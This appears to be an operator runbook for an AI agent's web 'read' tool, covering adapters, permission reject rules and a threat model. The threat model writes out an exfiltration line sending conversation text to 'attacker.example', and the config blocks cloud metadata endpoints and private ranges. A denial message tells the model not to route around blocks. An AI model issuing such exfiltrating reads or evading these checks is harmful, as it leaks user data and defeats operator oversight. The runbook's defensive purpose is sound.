---
summary: "Operator runbook for http(s):// reads: enabling, web adapters, derived locators, and the threat model"
read_when:
  - you are enabling, restricting, or rolling back web reads on an instance
  - you are configuring a web adapter, a rewrite entry, or the address rejects
behavior:
  - ../reference/locators/web.md
  - ../reference/tools/read.md
---

# Web reads

This runbook covers the operator side of `http://` and `https://` reads:
enabling them, configuring their adapters, and the permission boundary around
them. The model-visible contract — the locator form and normalization, the
adapter ladder and its `method` values, the rendered GitHub documents, the
bounds, and the errors — is in [web
locators](../reference/locators/web.md); the shared trailing-selector grammar is
in [selectors](../reference/selectors.md).

Deferred by design: response snapshots and any cache (#915), and PDF or image
bodies (#916). See [what is not
read](../reference/locators/web.md#what-is-not-read).

## Enabling

`read` must be named in `tools.allowed`. It is advertised whenever it is
allowlisted, because a web locator needs no `tools.nativeExecutorId` and binds
no executor identity; an absolute path on a process without accepted native
authority still fails closed with `executor_unavailable` (see
[native files](native-files.md)).

Restriction and reach are the `read` group in `tools.permissions` — there is no
web-specific key. The example below chooses the stricter policy of rejecting
all cleartext HTTP; the shipped address-aware replacement is described below:

```jsonc
{
  "tools": {
    "allowed": ["read"],
    "permissions": {
      "read": {
        "allow": true,
        "reject": [
          { "field": "path", "regex": "^http://" },
          {
            "field": "path",
            "regex": "^https?://([^/]*\\.)?grokipedia\\.com\\.?([/:]|$)",
          },
        ],
      },
    },
  },
}
```

The shipped example (`apps/api/llame.config.jsonc.example`) keeps `read` open
with a whole-tool allow plus the credential-locator rejects F1-F4, the
grokipedia reject F6, six cleartext-address rejects F5a-F5f, and metadata
reject F7. F5a-F5f reject `http://` address locators outside
`0.0.0.0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16`, `172.16/12`,
`192.168/16`, `::`, `::1`, `fc00::/7`, and `fe80::/10`; F7 rejects the known
metadata endpoints `169.254.169.254`, `169.254.170.2`, `169.254.0.23`,
`100.100.100.200`, and `[fd00:ec2::254]`. The F6 grokipedia clause refuses one
publisher's host, its subdomains, and a trailing-dot spelling. Both URL and
address decisions use ordinary `read.path` permission clauses: rejects veto
allows, matching is case-sensitive by default, and a supplied map is the
complete policy. Add F7 whichever cleartext rows you choose: `^http://` refuses
only `http://`, so without F7 an `https://` metadata read is admitted. Copy
F5a-F5f as a set. F5a-F5f widen cleartext reads to any hostname resolving into
one of their open internal ranges, including an attacker's zone or a spoofed
DNS answer. Keep `^http://` instead if every cleartext URL must remain refused.
Neither choice refuses `https://` to an internal address: loopback, LAN, and
tailnet hosts stay readable over HTTPS unless you add a reject for their
addresses, such as `^https://127\.` for loopback. Upgrade and restart every
API and Run worker process to this build before replacing `^http://` with
F5a-F5f; older binaries do not evaluate address locators. On rollback, restore
`^http://` before any older binary handles calls. See [tool-call
permissions](tool-call-permissions.md) for the clause grammar, decision order,
and pattern engine; its recommended policy table carries the same F5a-F5f, F6,
and F7 rows verbatim.

`User-Agent: llame/<version>` is taken from the boot-time instance-config
value; a process that resolved no version fails closed with
`executor_unavailable` (see [errors](../reference/locators/web.md#errors)).

To turn `read` into an allowlist of authorities instead of a whole-tool allow,
see [restricting reads to one
domain](tool-call-permissions.md#restricting-reads-to-one-domain).

## Adapter configuration

`tools.webAdapters` absent means `[]` (no adapter); when present, the array is
the exact ordered list, with no built-in entries. An entry is a `rewrite`,
`github`, `bluesky`, `npm`, `huggingface`, `arxiv`, or `stackexchange` entry. What an adapter does to a result — its
`method`, its provenance, its notes, and the documents it renders — is in [web
locators](../reference/locators/web.md#behavior).

A rewrite entry has the shape `{ id, use: "rewrite", hosts, pathPattern?,
target }`. `hosts` are exact canonical hostnames. `pathPattern`, when present,
is an RE2-compatible regular expression using the same bounded matcher as
`tools.permissions`, searched unanchored against the canonical path; anchor it
with `^` and `$` when whole-path matching is intended. `target` is a literal
`http` or `https` origin followed by a path/query template: `{path}` inserts
the canonical source path as-is, and `{query}` inserts
`encodeURIComponent` of the canonical query without `?`. Boot fails before
serving requests for an unknown field or use, duplicate id, noncanonical host,
invalid `pathPattern`, non-secret interpolation, or a target that is not
`http` or `https`, has userinfo or a fragment, or has an unknown, unbalanced,
or misplaced placeholder in the scheme, host, port, path, or query. There are
no per-entry headers, and rewrite targets receive no credentials.

A rewrite target is rebuilt and revalidated per call.

The runbook example entry is:

```jsonc
{
  "id": "x",
  "use": "rewrite",
  "hosts": ["x.com", "twitter.com"],
  "pathPattern": "^/[^/]+/status/\\d+$",
  "target": "https://x.pcstyle.dev{path}",
}
```

### GitHub adapter

Add a `github` entry to `tools.webAdapters` to render canonical GitHub
issues and pull requests through GitHub's API:

```jsonc
{
  "id": "github",
  "use": "github",
  "token": "{env:GITHUB_READ_TOKEN}",
}
```

`token` is optional, but when present it MUST be a whole-value interpolation
token such as `{env:GITHUB_READ_TOKEN}`; a literal token is rejected at boot.
Without a token, the adapter sends no `Authorization` header and private
repositories are not readable. A configured token is instance-wide authority:
every owner on the instance can address every repository visible to that token.
It is the operator's attestation, not tenant isolation. Use a fine-grained,
read-only token with the smallest repository scope that serves the instance.

The adapter claims only these canonical HTTPS shapes (query and fragment do not
change the claim):

- `https://github.com/{owner}/{repo}/issues/{number}`
- `https://github.com/{owner}/{repo}/pull/{number}`

The owner is an alphanumeric name with up to 39 characters and hyphens after
the first character; the repository is 1-100 characters from
`A-Z`, `a-z`, `0-9`, `.`, `_`, and `-` (but not `.` or `..`); and the number is
1-10 decimal digits with no leading zero. The adapter does not claim
`/pull/{number}.diff`, `/pull/{number}.patch`, `/pull/{number}/files`,
`/pull/{number}/commits`, or `/pull/{number}/checks`; `/issues` and `/pulls`
list URLs; Actions, Projects, Discussions, search results, or gists;
`raw.githubusercontent.com`; Enterprise hosts; or any write URL. Those
locators stay on the generic ladder without an adapter request or note.

The same entry claims canonical repository-code shapes:
`https://github.com/{owner}/{repo}`, `/tree/{ref}[/{path}]`,
`/blob/{ref}/{path}`, and `/commit/{sha}`. It does not claim
`/commit/{sha}.diff`, `/commit/{sha}.patch`, or any
`raw.githubusercontent.com` URL; the raw host is never requested.

Ref resolution first tries the first segment after `tree/` or `blob/` as the
ref. On a 404 with path segments remaining, branch and then tag matching can
resolve a longer ref. A blob or directory costs one API request; a repository
root costs three. A slash-containing branch costs three requests, and a
slash-containing tag costs four. A 40-hex SHA skips ref lookup. If a tag
matching the first segment succeeds before lookup, it shadows a longer branch;
for example, `/blob/v1/x/README.md` uses tag `v1` even when branch `v1/x`
exists. This is a documented resolution limit.

Binary or oversized blobs, and tree responses over 5 MiB, fall through.

The GitHub adapter's API locator is a separately admitted derived locator. With
a domain allowlist, add a `read` clause for the regex
`^https://api\.github\.com/` (JSONC spelling:
`^https://api\\.github\\.com/`) or the adapter falls through with
`permission`; allowing only the source `github.com` is not enough. The adapter
never requests `patch-diff.githubusercontent.com`; allow that host only when
separately reading the `Diff:` URL through the generic ladder. A token is sent
only to `api.github.com`, stripped on a cross-origin redirect, and never sent
to a source host or rewrite target.

Unauthenticated GitHub permits 60 requests per hour per egress IP, shared by
every owner using that egress. Configure a token for long threads or when the
instance shares an egress address with other users; paging a long thread
otherwise spends the same shared quota on every page.

### Bluesky adapter

Add a `bluesky` entry to render public Bluesky posts and accounts through the
unauthenticated AppView at `https://public.api.bsky.app`:

```jsonc
{ "id": "bluesky", "use": "bluesky" }
```

The entry takes no other field; Bluesky's public read API needs no key, and
the adapter sends no credential. It claims these canonical HTTPS shapes, with
query and fragment ignored:

- `https://bsky.app/profile/{actor}/post/{rkey}`: the post and its thread
- `https://bsky.app/profile/{actor}`: the profile and the original posts among
  its 30 most recent feed items (reposts are dropped)
- `https://bsky.app/profile/{actor}/followers` and `/follows`: the first 100
  accounts

`{actor}` is a handle or a DID; `read` takes a colon in the last path segment
as a selector, so a DID profile URL is written with `%3A`
(`/profile/did%3Aplc%3Aabc`), which the adapter decodes. Search, feeds, lists,
starter packs, a trailing slash, and other hosts stay on the generic ladder.
Bluesky's search endpoint refuses unauthenticated callers, so search is not
claimed.

A post costs one request, a profile two, and a follow list one. With a domain
allowlist, add a `read` clause for `^https://public\.api\.bsky\.app/` (JSONC
spelling: `^https://public\\.api\\.bsky\\.app/`) or the adapter falls through
with `permission`. The AppView rate-limits per egress IP; a `429` falls
through as `rate_limit`.

Accounts that label themselves `!no-unauthenticated`, which asks clients not
to show them to logged-out viewers, are withheld: their posts, profiles,
and follow lists fall through with `empty`, their replies and list entries
are omitted, and posts quoting them show the quote as unavailable. A label
another labeler applied is ignored, as bsky.app ignores it.

### npm adapter

Add an `npm` entry to render npm package pages, which `www.npmjs.com` answers
with a bot challenge instead of content:

```jsonc
{ "id": "npm", "use": "npm" }
```

The entry takes no other field and sends no credential. It claims
`https://www.npmjs.com/package/{name}` and `/package/{name}/v/{version}` (also
on `npmjs.com`), scoped names included; search, user pages, and the registry's
own JSON URLs stay on the generic ladder. A read costs three requests: the
version manifest from `https://registry.npmjs.org/{name}/{version}` (`latest`
when the URL names none), the dist-tags from
`https://registry.npmjs.org/-/package/{name}/dist-tags`, and the version's
`README.md` from `https://cdn.jsdelivr.net/npm/{name}@{version}/README.md`. The manifest
is primary; a missing dist-tags list or README keeps the rest with a
`dist-tags omitted:` or `readme omitted:` note, and a README with another file
name is reported as `readme omitted: status`. The full registry document is
never requested: for large packages it exceeds the 5 MiB body bound.

With a domain allowlist, add `read` clauses for `^https://registry\.npmjs\.org/`
and `^https://cdn\.jsdelivr\.net/npm/` (JSONC:
`^https://registry\\.npmjs\\.org/` and `^https://cdn\\.jsdelivr\\.net/npm/`).
Without the first, the manifest request is refused, the adapter falls through
with `permission`, and the generic ladder gets npmjs.com's bot challenge;
without the second, every read carries `readme omitted: permission`.

A manifest field of an unexpected shape, such as a maintainer without a name,
is left out rather than failing the read; a legacy `engines` array renders as a
list. A call deadline reached on the dist-tags request skips the README.

### Hugging Face adapter

Add a `huggingface` entry to render Hub repository pages as model-card
Markdown with their metadata:

```jsonc
{ "id": "huggingface", "use": "huggingface" }
```

The entry takes no other field and sends no credential, so a gated repository
renders metadata only and a private one falls through to the generic ladder. It claims
`https://huggingface.co/{owner}/{name}`, `/datasets/{owner}/{name}`, and
`/spaces/{owner}/{name}`; file, tree, and discussion pages, single-segment
legacy model ids, and Hub pages such as `/docs/...`, `/blog/...`, and
`/papers/...` stay on the generic ladder. A read costs two requests to
`https://huggingface.co`: `/api/{models|datasets|spaces}/{owner}/{name}` with
explicit `expand[]` fields, then the card at
`/[datasets/|spaces/]{owner}/{name}/raw/{revision}/README.md`. A README that
does not arrive, including a gated one, leaves `readme omitted: <failure>`.
With a domain allowlist, a clause for `^https://huggingface\.co/` covers both.

### arXiv adapter

Add an `arxiv` entry to read arXiv papers as text, including `/pdf/` links
that the generic ladder refuses by type:

```jsonc
{ "id": "arxiv", "use": "arxiv" }
```

The entry takes no other field and sends no credential. It claims
`https://arxiv.org/abs/{id}`, `/pdf/{id}` (with or without `.pdf`), and
`/html/{id}`, also on `www.arxiv.org`, for new-style (`2412.09871`) and
old-style (`hep-th/9901001`) ids with an optional version; listings, author
pages, and `export.arxiv.org` stay on the generic ladder. A read requests the
paper's HTML rendering at `https://arxiv.org/html/{id}` and converts it like
the generic Readability path, after replacing MathML with its LaTeX source.
When arXiv has no HTML for that version, it reads `https://arxiv.org/abs/{id}`,
rendered the same way, and adds `full text omitted: <failure>`; a read costs
one request, or two on that fallback. With a domain allowlist, a clause for
`^https://arxiv\.org/` covers both. Both are derived locators admitted on
their own: with only `^https://arxiv\.org/abs/`, the HTML request is refused,
so every read degrades to the abstract with `full text omitted: permission`;
with neither path admitted, the read falls through with `permission`.

### Stack Exchange adapter

Add a `stackexchange` entry to read Stack Overflow and other Stack Exchange
questions, which the sites answer with a bot challenge:

```jsonc
{ "id": "stackexchange", "use": "stackexchange" }
```

The entry takes no other field and sends no credential. It claims
`/questions/{id}[/{slug}[/{answerId}]]`, `/q/{id}[/{user}]`, and
`/a/{id}[/{user}]` on `stackoverflow.com` and its language and meta sites
(`ru.stackoverflow.com`, `meta.stackoverflow.com`), `superuser.com`,
`serverfault.com`, `askubuntu.com`, `mathoverflow.net`, `stackapps.com`, and
`{site}.stackexchange.com` hosts including their metas; tag, user, and listing
pages stay on the generic ladder. A read
requests the question and then up to 100 answers by score from
`https://api.stackexchange.com/2.3/` (an `/a/` link first looks up its
question), so it costs two or three requests. Keyless use shares a quota of
300 requests per day per IP address. The API reports a spent quota or a
throttle as HTTP 400, so until it resets reads fall through with `status`, or
keep the question with `answers omitted: status`. With a domain allowlist, add a
clause for `^https://api\.stackexchange\.com/`.

## Derived locators and permission admission

A web read derives locators the model never wrote: redirect hops, an announced
alternate, a suffix candidate, an `llms.txt` candidate, and an adapter target.
Each one is evaluated against the `read` permission group before its request,
as if the model had submitted it, through the same evaluator and the same
normalization the call used, minus the read-selector removal a submitted call
gets.
It inherits nothing from the admitted call or from an earlier derived locator.

The two forms policy sees differ, and the difference matters when you write
clauses:

- A locator is matched twice: as the model submitted it, with only a split-off
  read selector removed (so a submitted fragment remains), and as the read tool
  parses it — fragment cut, host, port, and encoding normalized. Only the
  selector suffix itself is removed; text inside a kept fragment (for example,
  `#x:raw`) remains in the submitted text and can still match a clause. A read
  selector is removed from both texts, so `^https://docs\.example\.com/guide$`
  admits `.../guide:raw` and a clause written against a selector spelling such
  as `:raw` matches no read. A reject matching either refuses the call; the
  allow is decided on the parsed text, which is the one the request uses.
- A derived locator carries no selector of the model's, so none is removed
  from it: it is matched exactly as it will be requested, with its own
  selector spelling kept, and a hop ending in `:5` is judged with that text.
- A hop locator is the `Location` value resolved against the redirecting
  request's URL and serialized by the WHATWG parser as its `href`, with any
  fragment dropped: lowercase host, an internationalized host as punycode, a
  default port dropped, an empty path as `/`, and path and query percent-escapes
  normalized to the same fixed point as submitted locators. A stray `%` becomes
  `%25`, unreserved escapes are decoded, and remaining escapes keep uppercase
  hex. Write hop-relevant rules against that form, not against the spelling
  the server happened to send.

Redirects are followed on any host for 301, 302, 303, 307, and 308. A redirect
status without a parsable `Location`, or a hop carrying userinfo or a non-web
scheme, fails with `invalid_redirect` before any request to that target, and
the error never names it; on the call's own request it ends the read, while a
probe's own redirect disqualifies only that candidate. A fragment is dropped
rather than refused, before admission and before the request, so the text
policy matches is exactly the URL the request fetches — which matters when a
clause is anchored on the locator's exact end, as in the [domain
allowlist](tool-call-permissions.md#restricting-reads-to-one-domain).

A rejected hop ends the call, and the refused target's body is never read.
`rejectedUrl` drops the query and fragment, so a signed query string in a
`Location` never reaches the model; the model-visible result is described in
[web locators](../reference/locators/web.md#behavior). A rejected probe
locator, by contrast, does not end the call, so a hostile page cannot make a
read of itself fail by announcing a refused alternate.

Every derived-locator decision is recorded privately, beside the call decision,
when the call settles: owner-scoped tool activity and the stored tool part
carry the decision, its static reason, a bounded clause reference, and the same
policy-instance ID the call decision carries. The record never travels through
the model-visible result, and it stays excluded from model replay, public
shares, exports, and search.

Each adapter target is a derived locator admitted independently by the `read`
group before I/O as kind `adapter`; its redirect hops are admitted under the
same rules.

### Address locators and connection pinning

After a request's locator passes its usual text admission, the tool determines
the addresses that request may connect to. Each non-literal host is resolved
through the system resolver once per host per call; a host that is an IP
literal is its own single address. A later request in the call reuses that
host's resolver answer. This applies to submitted locators, redirect hops,
announced alternates, suffix candidates, `llms.txt` probes, and adapter or
rewrite targets.

An address locator is exactly the requested URL with only its host replaced.
It keeps the scheme, port, path, and query; it never includes a read selector.
IPv4 is written in dotted decimal, IPv6 in lowercase compressed WHATWG form
inside brackets, and IPv4-mapped IPv6 as the dotted IPv4 address it maps to.
An IPv6 zone identifier is dropped. For example:

- `https://docs.example.com:8443/guide?q=1` resolving to `93.184.216.34` is
  also judged as `https://93.184.216.34:8443/guide?q=1`.
- `https://files.example/private` resolving to `2001:db8::10` is also judged
  as `https://[2001:db8::10]/private`.
- The URL's canonical `https://[::ffff:7f00:1]/` form and resolver answer
  `::ffff:127.0.0.1` both produce address locator `https://127.0.0.1/`.
- `https://docs.example.com/guide:raw` resolving to `93.184.216.34` is judged
  as `https://93.184.216.34/guide`; the selector is not requested.

Address locators are judged by the `read` group's reject clauses only. Allows
never see an address: a domain allowlist would otherwise refuse every CDN
address as `no_allow`, while a broad IP allow would also admit model-typed IP
URLs and reopen the path the domain allowlist closes. Every address is judged
before connection; refused addresses are skipped and the runtime races only
the admitted addresses through a per-request dispatcher. That dispatcher can
dial only the judged admitted set, so whichever address wins was judged; no
connection is reused across requests.

If every address is refused on the submitted locator or a redirect hop, the
call ends with `permission_denied` and this fixed message (a refused redirect
also has its hostname-form locator in `rejectedUrl`):

> Tool call stopped by operator permissions. Every address of the target host was refused before a connection was opened; when the target was a redirect, it is in rejectedUrl. Do not retry this call, disguise the same target through another tool, or delegate it to another agent. In-run approval is unavailable. Continue with other permitted work; if this content is required, explain the blocked target to the user.

If every address of a probe is refused, only that candidate is disqualified.
Refused addresses are recorded privately as derived-locator decisions of kind
`address`; neither the address nor its address locator is recorded or exposed
in a result, message, or note.

## Threat model

**Fetched text is untrusted input.** Nothing in the tool neutralizes or
annotates a fetched page, and the `read` group is the only boundary; see [web
locators](../reference/locators/web.md#authority) for what a page can do to
the model.

**A URL is an outbound channel.** A GET's path and query are model-authored, so
under a whole-tool allow `read https://attacker.example/?d=<conversation text>`
is one admitted call that carries data out of the process. The operator's
`read` group bounds that direction too; a domain allowlist (see [restricting
reads to one
domain](tool-call-permissions.md#restricting-reads-to-one-domain)) is the
mitigation, and it is only as good as the canonical text it matches.

A rewrite sends the source path, and the source query when `{query}` is
templated, to the operator-declared origin. The runbook `x.com` example leaks
the status path to `x.pcstyle.dev`; the entry is opt-in, and the `read` policy
is the outbound boundary.

**Every request is judged at the address it can dial.** For the submitted URL
and every hop or probe, the tool uses one system-resolver answer per host per
call (or the IP literal itself), skips refused addresses, and races only
admitted addresses through a per-request connection pinned to that judged set.
Connections are not reused across requests, and there is no built-in private-
range guard: the `read` group's rejects decide. The address-locator form and
reject-only rule are described above.

**Address admission is not a general network sandbox.** A public host that
proxies to an internal service is invisible to this check, and rules cover
only the address the target host resolves to, not every address or interface
of a protected server. On Linux, `0.0.0.0` and `::` can reach loopback; reject
them too if loopback must be refused. DNS sends hostname labels out before the
address decision, so only URL-text rules can bound that channel. Web reads
ignore environment proxies. F5f refuses NAT64 `64:ff9b::/96` for cleartext,
but an HTTPS rule for an IPv4 address does not match its embedded IPv4 form.
These address checks govern web `read`, not host `bash`.

**Publisher signals are not permission.** An admitted read is not presented as
the publisher's consent. An operator who wants a preference respected writes a
`path` reject for the host — the shipped grokipedia clause is that pattern.
llame does not rotate its `User-Agent`, impersonate a browser, or circumvent a
challenge; a challenge page is reported in a note instead.

## Troubleshooting

| Symptom                                             | Check                                                                                                                                       |
| --------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `permission_denied` with `rejectedUrl`              | the redirect hop or every address for it was refused; check the target's URL and address-locator rejects                                    |
| `permission_denied` without `rejectedUrl`           | the submitted URL was refused, had no matching allow, or all its addresses were refused; check its URL clauses and address-locator rejects  |
| `invalid_path` naming a spelling                    | the locator is not a URL; resubmit exactly the spelling the message names                                                                   |
| `invalid_selector` naming a `%3A` spelling          | the last path segment holds a literal colon; use the suggested encoded locator or a real selector                                           |
| `unsupported_content_type` naming `application/pdf` | document reads are not implemented (#916)                                                                                                   |
| `http_status` 403, or `raw` with a challenge note   | the publisher blocked the client; llame does not rotate its user agent or solve challenges                                                  |
| `headers_timeout` or `body_too_large`               | that candidate exceeded a bound; a probe is disqualified and the pipeline continues, while the page's own response ends the call            |
| `call_timeout`                                      | the call spent its 30-second budget across its requests; the read is not retried, so point the model at a smaller source                    |
| More requests than expected                         | a page with no publisher Markdown costs an alternate, a suffix probe, a render, and sometimes an `llms.txt` walk; `method` names the winner |
